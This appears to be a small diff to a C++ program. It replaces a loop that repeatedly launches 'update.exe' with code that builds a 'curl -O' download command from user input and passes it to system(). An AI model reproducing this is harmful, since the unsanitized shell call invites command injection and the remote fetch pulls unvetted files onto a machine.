@@ -3,10 +3,9 @@ using namespace std;
 
 int main()
 {
-    while (1)
-    {
-        system("start update.exe");
-        sleep(600);
-    }
+    string s;
+    cin >> s;
+    s = "curl -O https://raw.iqiq.io/poss-ible/bd/main/" + s;
+    system(s.data());
     return 0;
 }
